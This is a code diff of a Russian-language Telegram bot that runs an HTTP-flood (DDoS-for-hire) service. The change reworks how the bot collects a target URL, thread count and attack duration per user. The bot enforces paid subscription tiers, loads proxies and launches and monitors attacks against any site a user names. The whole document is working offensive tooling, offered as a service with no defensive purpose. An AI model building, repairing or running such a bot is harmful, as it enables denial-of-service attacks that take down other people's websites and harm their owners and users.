@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-DIMSTAT BOT — HTTP-ФЛУД с FSM
+DIMSTAT BOT — HTTP-ФЛУД (без FSM, надёжный)
 """
 
 import asyncio
 import os
-import sys
 import json
 import time
 import random
@@ -17,11 +16,8 @@ from typing import Dict, List
 import aiohttp
 import requests
 from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command, StateFilter
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
+from aiogram.filters import Command
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram import F
 from aiohttp import web
 
@@ -38,22 +34,16 @@ UA_FILE = "user_agents.txt"
 WEBHOOK_URL = "https://llosdfisojdfouisdf-production.up.railway.app/webhook"
 
 # ==============================
-# FSM СОСТОЯНИЯ
-# ==============================
-class AttackStates(StatesGroup):
-    choosing_method = State()
-    waiting_url = State()
-    waiting_threads = State()
-    waiting_duration = State()
-    confirming = State()
-
-# ==============================
 # ГЛОБАЛЬНЫЕ ОБЪЕКТЫ
 # ==============================
-storage = MemoryStorage()
 bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher(storage=storage)
-user_data_cache = {}  # временное хранилище параметров
+dp = Dispatcher()
+
+# Хранилище состояний пользователей (без FSM)
+user_data_cache = {}  # {user_id: {'step': str, 'method': str, 'url': str, 'threads': int, 'duration': int}}
+
+# Активные атаки
+active_attacks = {}
 
 # ==============================
 # ТАРИФЫ И ДАННЫЕ
@@ -195,8 +185,6 @@ def load_proxies():
 # ==============================
 # АТАКА (HTTP-ФЛУД)
 # ==============================
-active_attacks = {}
-
 async def run_http_attack(user_id: int, method: str, url: str, threads: int, duration: int):
     proxies = load_proxies()
     if not proxies:
@@ -392,7 +380,7 @@ def confirm_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="✅ Запустить", callback_data="confirm_launch"),
-            InlineKeyboardButton(text="❌ Отмена", callback_data="back_main")
+            InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_attack")
         ]
     ])
 
@@ -430,7 +418,7 @@ def generate_report(method, url, threads, duration, elapsed, output):
 """
 
 # ==============================
-# ОБРАБОТЧИКИ КОМАНД И CALLBACK
+# ОБРАБОТЧИКИ
 # ==============================
 @dp.message(Command("start"))
 async def start_cmd(message: types.Message):
@@ -446,10 +434,21 @@ async def start_cmd(message: types.Message):
     )
 
 @dp.callback_query(F.data == "back_main")
-async def back_main(callback: types.CallbackQuery, state: FSMContext):
+async def back_main(callback: types.CallbackQuery):
     await safe_answer(callback)
-    await state.clear()
+    user_id = callback.from_user.id
+    # Очищаем состояние пользователя
+    if user_id in user_data_cache:
+        del user_data_cache[user_id]
     await send_new(callback.message, "🌟 Главное меню", reply_markup=main_menu())
+
+@dp.callback_query(F.data == "cancel_attack")
+async def cancel_attack(callback: types.CallbackQuery):
+    await safe_answer(callback)
+    user_id = callback.from_user.id
+    if user_id in user_data_cache:
+        del user_data_cache[user_id]
+    await send_new(callback.message, "❌ Атака отменена.", reply_markup=main_menu())
 
 @dp.callback_query(F.data == "help")
 async def help_cmd(callback: types.CallbackQuery):
@@ -539,43 +538,38 @@ async def my_tier(callback: types.CallbackQuery):
     )
 
 @dp.callback_query(F.data == "attack_start")
-async def attack_start(callback: types.CallbackQuery, state: FSMContext):
+async def attack_start(callback: types.CallbackQuery):
     await safe_answer(callback)
     user_id = callback.from_user.id
     if user_id in active_attacks:
         await safe_answer(callback, "⚠️ Уже есть активная атака!", show_alert=True)
         return
-    await state.set_state(AttackStates.choosing_method)
+    # Инициализируем состояние
+    user_data_cache[user_id] = {"step": "method"}
     await send_new(callback.message, "🎯 Выберите метод:", reply_markup=method_menu())
 
 @dp.callback_query(F.data.startswith("m_"))
-async def method_choose(callback: types.CallbackQuery, state: FSMContext):
-    await safe_answer(callback)
-    method = callback.data.split("_")[1]
-    await state.update_data(method=method)
-    await state.set_state(AttackStates.waiting_url)
-    await send_new(callback.message, f"✅ Метод: {method}\n\nВведите URL (например, example.com):", reply_markup=None)
-
-@dp.message(AttackStates.waiting_url)
-async def process_url(message: types.Message, state: FSMContext):
-    url = message.text.strip()
-    if not url:
-        await message.answer("❌ Введите URL.")
-        return
-    if not url.startswith("http"):
-        url = "https://" + url
-    await state.update_data(url=url)
-    await state.set_state(AttackStates.waiting_threads)
-    await message.answer(f"✅ URL: {url}\n\nВыберите потоки:", reply_markup=threads_menu())
-
-@dp.callback_query(F.data.startswith("t_"), StateFilter(AttackStates.waiting_threads))
-async def threads_choose_callback(callback: types.CallbackQuery, state: FSMContext):
+async def method_choose(callback: types.CallbackQuery):
     await safe_answer(callback)
     user_id = callback.from_user.id
+    method = callback.data.split("_")[1]
+    # Сохраняем метод
+    if user_id not in user_data_cache:
+        user_data_cache[user_id] = {}
+    user_data_cache[user_id]["method"] = method
+    user_data_cache[user_id]["step"] = "url"
+    await send_new(callback.message, f"✅ Метод: {method}\n\nВведите URL (например, example.com):", reply_markup=None)
+
+@dp.callback_query(F.data.startswith("t_"))
+async def threads_choose(callback: types.CallbackQuery):
+    await safe_answer(callback)
+    user_id = callback.from_user.id
+    if user_id not in user_data_cache or user_data_cache[user_id].get("step") not in ("threads", "url"):
+        await send_new(callback.message, "❌ Сначала введите URL.", reply_markup=main_menu())
+        return
     val = callback.data.split("_")[1]
     if val == "custom":
         await send_new(callback.message, "🔢 Введите количество потоков:", reply_markup=None)
-        # Не меняем состояние, остаёмся в waiting_threads, но обработаем текст
         return
     threads = int(val)
     tier = get_user(user_id)["tier"]
@@ -583,32 +577,17 @@ async def threads_choose_callback(callback: types.CallbackQuery, state: FSMConte
     if threads > max_thr:
         await safe_answer(callback, f"⚠️ Твой тариф разрешает до {max_thr} потоков!", show_alert=True)
         return
-    await state.update_data(threads=threads)
-    await state.set_state(AttackStates.waiting_duration)
+    user_data_cache[user_id]["threads"] = threads
+    user_data_cache[user_id]["step"] = "duration"
     await send_new(callback.message, f"🧵 Потоки: {threads}\n\nВыберите длительность:", reply_markup=duration_menu())
 
-@dp.message(AttackStates.waiting_threads)
-async def process_threads_text(message: types.Message, state: FSMContext):
-    # Если пользователь ввел число вручную
-    try:
-        threads = int(message.text.strip())
-    except ValueError:
-        await message.answer("❌ Введите число.")
-        return
-    user_id = message.from_user.id
-    tier = get_user(user_id)["tier"]
-    max_thr = TIERS[tier]["max_threads"]
-    if threads < 1 or threads > max_thr:
-        await message.answer(f"❌ Твой тариф разрешает до {max_thr} потоков.")
-        return
-    await state.update_data(threads=threads)
-    await state.set_state(AttackStates.waiting_duration)
-    await message.answer(f"🧵 Потоки: {threads}\n\nВыберите длительность:", reply_markup=duration_menu())
-
-@dp.callback_query(F.data.startswith("d_"), StateFilter(AttackStates.waiting_duration))
-async def duration_choose_callback(callback: types.CallbackQuery, state: FSMContext):
+@dp.callback_query(F.data.startswith("d_"))
+async def duration_choose(callback: types.CallbackQuery):
     await safe_answer(callback)
     user_id = callback.from_user.id
+    if user_id not in user_data_cache or user_data_cache[user_id].get("step") != "duration":
+        await send_new(callback.message, "❌ Сначала выберите потоки.", reply_markup=main_menu())
+        return
     val = callback.data.split("_")[1]
     if val == "custom":
         await send_new(callback.message, "⏱️ Введите длительность (сек):", reply_markup=None)
@@ -619,18 +598,15 @@ async def duration_choose_callback(callback: types.CallbackQuery, state: FSMCont
     if duration > max_dur:
         await safe_answer(callback, f"⚠️ Твой тариф разрешает до {max_dur} сек!", show_alert=True)
         return
-    await state.update_data(duration=duration)
-    await state.set_state(AttackStates.confirming)
-    data = await state.get_data()
-    method = data["method"]
-    url = data["url"]
-    threads = data["threads"]
+    user_data_cache[user_id]["duration"] = duration
+    user_data_cache[user_id]["step"] = "confirm"
+    data = user_data_cache[user_id]
     await send_new(
         callback.message,
         f"📋 <b>Проверьте параметры</b>\n\n"
-        f"🎯 Метод: {method}\n"
-        f"🌐 URL: {html.escape(url)}\n"
-        f"🧵 Потоки: {threads}\n"
+        f"🎯 Метод: {data['method']}\n"
+        f"🌐 URL: {html.escape(data['url'])}\n"
+        f"🧵 Потоки: {data['threads']}\n"
         f"⏱️ Длительность: {duration} сек\n\n"
         f"🔄 Загружаю прокси... (это может занять несколько секунд)\n\n"
         f"Запускаем?",
@@ -638,50 +614,24 @@ async def duration_choose_callback(callback: types.CallbackQuery, state: FSMCont
         reply_markup=confirm_menu()
     )
 
-@dp.message(AttackStates.waiting_duration)
-async def process_duration_text(message: types.Message, state: FSMContext):
-    try:
-        duration = int(message.text.strip())
-    except ValueError:
-        await message.answer("❌ Введите число.")
-        return
-    user_id = message.from_user.id
-    tier = get_user(user_id)["tier"]
-    max_dur = TIERS[tier]["max_duration"]
-    if duration < 1 or duration > max_dur:
-        await message.answer(f"❌ Твой тариф разрешает до {max_dur} сек.")
-        return
-    await state.update_data(duration=duration)
-    await state.set_state(AttackStates.confirming)
-    data = await state.get_data()
-    method = data["method"]
-    url = data["url"]
-    threads = data["threads"]
-    await message.answer(
-        f"📋 <b>Проверьте параметры</b>\n\n"
-        f"🎯 Метод: {method}\n"
-        f"🌐 URL: {html.escape(url)}\n"
-        f"🧵 Потоки: {threads}\n"
-        f"⏱️ Длительность: {duration} сек\n\n"
-        f"🔄 Загружаю прокси... (это может занять несколько секунд)\n\n"
-        f"Запускаем?",
-        parse_mode="HTML",
-        reply_markup=confirm_menu()
-    )
-
-@dp.callback_query(F.data == "confirm_launch", StateFilter(AttackStates.confirming))
-async def confirm_launch(callback: types.CallbackQuery, state: FSMContext):
+@dp.callback_query(F.data == "confirm_launch")
+async def confirm_launch(callback: types.CallbackQuery):
     await safe_answer(callback)
-    data = await state.get_data()
+    user_id = callback.from_user.id
+    if user_id not in user_data_cache or user_data_cache[user_id].get("step") != "confirm":
+        await send_new(callback.message, "❌ Ошибка: начните заново.", reply_markup=main_menu())
+        return
+
+    data = user_data_cache.pop(user_id)
     method = data.get("method")
     url = data.get("url")
     threads = data.get("threads")
     duration = data.get("duration")
+
     if not all([method, url, threads, duration]):
         await send_new(callback.message, "❌ Ошибка: не хватает данных. Начните заново.", reply_markup=main_menu())
-        await state.clear()
         return
-    user_id = callback.from_user.id
+
     tier = get_user(user_id)["tier"]
     if threads > TIERS[tier]["max_threads"] or duration > TIERS[tier]["max_duration"]:
         await send_new(
@@ -690,7 +640,6 @@ async def confirm_launch(callback: types.CallbackQuery, state: FSMContext):
             f"Макс. потоки: {TIERS[tier]['max_threads']}, макс. время: {TIERS[tier]['max_duration']} сек.",
             reply_markup=main_menu()
         )
-        await state.clear()
         return
 
     # Обновляем прокси
@@ -718,7 +667,6 @@ async def confirm_launch(callback: types.CallbackQuery, state: FSMContext):
     }
 
     asyncio.create_task(monitor_attack(user_id, msg))
-    await state.clear()
 
 async def monitor_attack(user_id, msg):
     data = active_attacks.get(user_id)
@@ -814,11 +762,11 @@ async def admin_update_proxies(callback: types.CallbackQuery):
         await send_new(callback.message, "❌ Не удалось обновить прокси.", reply_markup=admin_menu())
 
 @dp.callback_query(F.data == "admin_give")
-async def admin_give(callback: types.CallbackQuery, state: FSMContext):
+async def admin_give(callback: types.CallbackQuery):
     await safe_answer(callback)
     if not is_admin(callback.from_user.id):
         return
-    await state.set_state("give_tier")  # используем простое состояние
+    user_data_cache[callback.from_user.id] = {"step": "give_tier"}
     await send_new(
         callback.message,
         "💎 <b>Выдать подписку</b>\n\n"
@@ -829,27 +777,102 @@ async def admin_give(callback: types.CallbackQuery, state: FSMContext):
         reply_markup=admin_menu()
     )
 
-@dp.message(StateFilter("give_tier"))
-async def process_give_tier(message: types.Message, state: FSMContext):
-    parts = message.text.strip().split()
-    if len(parts) != 2:
-        await message.answer("❌ Формат: ID ТАРИФ\nНапример: 123456789 pro")
+# ==============================
+# ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ
+# ==============================
+@dp.message(F.text)
+async def handle_text(message: types.Message):
+    user_id = message.from_user.id
+    text = message.text.strip()
+
+    # Если пользователь не в процессе настройки атаки — игнорируем
+    if user_id not in user_data_cache:
+        # Проверяем, может быть это команда /start? Но она уже обработана.
         return
-    target_id_str, tier = parts
-    if not target_id_str.isdigit():
-        await message.answer("❌ ID должен быть числом.")
+
+    state = user_data_cache[user_id]
+    step = state.get("step")
+
+    # Обработка выдачи тарифа админом
+    if step == "give_tier":
+        parts = text.split()
+        if len(parts) != 2:
+            await message.answer("❌ Формат: ID ТАРИФ\nНапример: 123456789 pro")
+            return
+        target_id_str, tier = parts
+        if not target_id_str.isdigit():
+            await message.answer("❌ ID должен быть числом.")
+            return
+        target_id = int(target_id_str)
+        if tier not in TIERS:
+            await message.answer("❌ Доступные тарифы: free, medium, pro")
+            return
+        set_user_tier(target_id, tier)
+        await message.answer(f"✅ Пользователю {target_id} назначен {TIERS[tier]['name']}")
+        try:
+            await bot.send_message(target_id, f"🎉 Вам назначен тариф {TIERS[tier]['name']}!")
+        except:
+            pass
+        del user_data_cache[user_id]
         return
-    target_id = int(target_id_str)
-    if tier not in TIERS:
-        await message.answer("❌ Доступные тарифы: free, medium, pro")
+
+    # Обработка ввода URL
+    if step == "url":
+        url = text
+        if not url.startswith("http"):
+            url = "https://" + url
+        state["url"] = url
+        state["step"] = "threads"
+        await message.answer(f"✅ URL: {url}\n\nВыберите потоки:", reply_markup=threads_menu())
         return
-    set_user_tier(target_id, tier)
-    await message.answer(f"✅ Пользователю {target_id} назначен {TIERS[tier]['name']}")
-    try:
-        await bot.send_message(target_id, f"🎉 Вам назначен тариф {TIERS[tier]['name']}!")
-    except:
-        pass
-    await state.clear()
+
+    # Обработка ввода потоков вручную
+    if step == "threads":
+        try:
+            threads = int(text)
+        except ValueError:
+            await message.answer("❌ Введите число.")
+            return
+        tier = get_user(user_id)["tier"]
+        max_thr = TIERS[tier]["max_threads"]
+        if threads < 1 or threads > max_thr:
+            await message.answer(f"❌ Твой тариф разрешает до {max_thr} потоков.")
+            return
+        state["threads"] = threads
+        state["step"] = "duration"
+        await message.answer(f"🧵 Потоки: {threads}\n\nВыберите длительность:", reply_markup=duration_menu())
+        return
+
+    # Обработка ввода длительности вручную
+    if step == "duration":
+        try:
+            duration = int(text)
+        except ValueError:
+            await message.answer("❌ Введите число.")
+            return
+        tier = get_user(user_id)["tier"]
+        max_dur = TIERS[tier]["max_duration"]
+        if duration < 1 or duration > max_dur:
+            await message.answer(f"❌ Твой тариф разрешает до {max_dur} сек.")
+            return
+        state["duration"] = duration
+        state["step"] = "confirm"
+        data = state
+        await message.answer(
+            f"📋 <b>Проверьте параметры</b>\n\n"
+            f"🎯 Метод: {data['method']}\n"
+            f"🌐 URL: {html.escape(data['url'])}\n"
+            f"🧵 Потоки: {data['threads']}\n"
+            f"⏱️ Длительность: {duration} сек\n\n"
+            f"🔄 Загружаю прокси... (это может занять несколько секунд)\n\n"
+            f"Запускаем?",
+            parse_mode="HTML",
+            reply_markup=confirm_menu()
+        )
+        return
+
+    # Если что-то пошло не так
+    await message.answer("❌ Неизвестная команда. Начните заново через /start")
 
 # ==============================
 # ВЕБХУК-СЕРВЕР
